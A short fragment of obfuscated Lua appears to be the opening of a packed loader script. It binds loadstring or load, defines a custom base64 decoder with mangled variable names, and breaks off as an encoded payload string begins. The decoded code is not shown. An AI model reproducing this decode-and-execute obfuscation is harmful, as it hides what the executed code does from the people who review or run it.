return(function(...)local qG,yN,lP,wN,xX,dD,dE,cX,cE,iF,gL,hV,bB,wY,gF,pA,dU,zC,uK,nJ=nil,nil,pcall,error,loadstring or load,function(s)local t={};for u in string.gmatch(s,'[^%s]+')do table.insert(t,u)end;s=table.concat(t);s=string.gsub(s,'[^%w%+/]','');local v='';local w=0x0;local x=0x0;for y=1,#s do local z=string.sub(s,y,y);local A=0x0;if z>='A' and z<='Z'then A=string.byte(z)-0x41;elseif z>='a' and z<='z'then A=string.byte(z)-0x47;elseif z>='0' and z<='9'then A=string.byte(z)+0x4;elseif z=='+'then A=0x3E;elseif z=='/'then A=0x3F;end;w=bit32.bor(bit32.lshift(w,0x6),A);x=x+0x6;if x>=0x8 then x=x-0x8;local B=bit32.band(bit32.rshift(w,x),0xFF);v=v..string.char(B)end end;return v end,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil;qG=[==[